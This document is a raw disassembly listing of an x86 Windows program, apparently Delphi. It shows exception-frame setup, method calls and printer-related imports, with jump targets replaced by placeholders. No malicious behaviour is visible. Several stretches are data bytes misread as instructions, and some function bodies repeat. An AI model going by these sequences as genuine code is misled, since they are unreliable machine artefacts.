jae r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_4040e8
lodsd [ esi ]
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0x57c07265
adc ecx [ ecx + 0x45 ]
insd
cmp al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
jns r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
pop eax
inc edx
add bh bh
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
jmp r-xdata
inc edx
jo r-xdata
outsb
dec eax
insb
jo r-xdata
cmp cl [ ecx ]
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x425800c0 ]
add [ edi ] cl
dec ecx
imul esp [ ebp + 0x77 ] 0x57fc7265
inc edx
add [ ecx ] al
xchg bx ax
cld
xor al [ eax ]
xor al 0x33
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc eax
add ah bl
xor al [ eax ]
clc
outsb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264ee
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404b1c
lea eax [ ebp - 0x8 ]
call sub_4057e0
retn
inc ebx
xor edi edi
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
cmp al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
outsb
je r-xdata
jae r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405824
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425748
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424b6c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057f8
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405824
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
outsd
outsb
je r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
inc esp
push edi
inc edx
lodsd [ esi ]
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
imul esp [ ebp + 0x77 ] 0x113c7265
inc eax
add [ ecx ] al
xchg ebx eax
cld
jae r-xdata
adc eax 0x65705349
je r-xdata
dec [ ebx + 0x425790c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
insd
dec eax
insb
jo r-xdata
sub_4258b4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
pop eax
inc edx
add [ eax + eax ] cl
add [ eax ] al
adc al 0x72
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
push esi
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4264e7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
int3
mov eax eax
imul ebp [ edi + 0x6e ] 0x6000408d
pop ecx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x59 ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x59 ] dh
inc edx
add [ eax + eax ] cl
add [ eax ] al
enter 0x4010 0x0
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_4040e8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264ee
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404b1c
lea eax [ ebp - 0x8 ]
call sub_4057e0
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405824
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424b6c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057f8
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405824
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_425941
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al al
push edi
inc edx
add [ eax + eax ] al
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
int3
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4264e7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_4040e8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264ee
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404b1c
lea eax [ ebp - 0x8 ]
call sub_4057e0
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405824
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424b6c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057f8
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405824
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_425b18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_425b8e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_425ca4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4057f8
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b95
lea eax [ ebp - 0x8 ]
call sub_4057e0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425c30
mov [ rw-data ] eax
sub_425b9c
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_425c30
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405824
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_425bf4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4057f8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_425c30
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
mov dl 0x1
mov eax [ r-xdata ]
call sub_424ad8
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424ad8
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424ad8
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_404094
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_425ca4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_425da5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_425bf4
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424b88
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4057e0
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d6b0
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4057e0
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d6b0
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_425bf4
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424b88
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_425bf4
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424b88
mov ecx r-xdata
call sub_405824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425dac
lea eax [ ebp - 0xc ]
call sub_4057e0
lea eax [ ebp - 0x8 ]
call sub_4057e0
retn
sub edx 0xfffffff8
sub_425dc4
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_424b6c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_425e04
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_424b6c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_425e34
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_425fc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_424b6c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425f61
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425fcd
lea eax [ ebp - 0x10 ]
call sub_404094
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_424b6c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
mov eax esi
xor edx edx
call sub_424b6c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_424b6c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403344
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_424b6c
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_425fd4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4260b9
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_4040e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4260c0
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404b1c
lea eax [ ebp - 0x8 ]
call sub_4057e0
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_424b6c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057f8
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405824
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_424b6c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057f8
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405824
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_4262f0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4263e3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_4040e8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263ea
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404b1c
lea eax [ ebp - 0x10 ]
call sub_4057e0
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405824
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_424b6c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4057f8
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405824
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_426408
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4264e7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_4040e8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264ee
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404b1c
lea eax [ ebp - 0x8 ]
call sub_4057e0
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405824
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424b6c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057f8
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405824
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_426508
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405854
xor eax eax
push ebp
push sub_426557
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4057f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42655e
lea eax [ ebx + 0xc ]
call sub_4057e0
sub_426564
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404544
xor eax eax
push ebp
push sub_4265f9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_4040e8
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4262f0
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426600
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax ebx
call sub_425e04
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_425e34
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_425fd4
sub_426624
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_424b6c
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_424b6c
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41425c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_424b6c
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_41425c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_41425c
sub_4266b0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_425dc4
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403344
mov eax [ esi + 0x14 ]
call sub_403344
mov eax [ esi + 0x10 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4057e0
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_426704
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42673b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426742
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42676c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426791
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426798
retn
sub_4268ac
push esi
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
cmp [ edx ] 0x20
je r-xdata
inc edx
mov esi edx
jmp r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
sub_426978
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40428c
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_40428c
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_40428c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4269d8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_426a4b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40428c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_4044a0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426a52
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_40428c
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_4044a0
je r-xdata
sub_426a5c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
mov [ esi + 0x14 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_426a98
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_426b14
mov eax esi
call sub_42742c
mov eax esi
call sub_427468
mov eax [ esi + 0x4 ]
call sub_403344
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax esi
call sub_426cb0
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call ClosePrinter
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
push eax
call GlobalUnlock
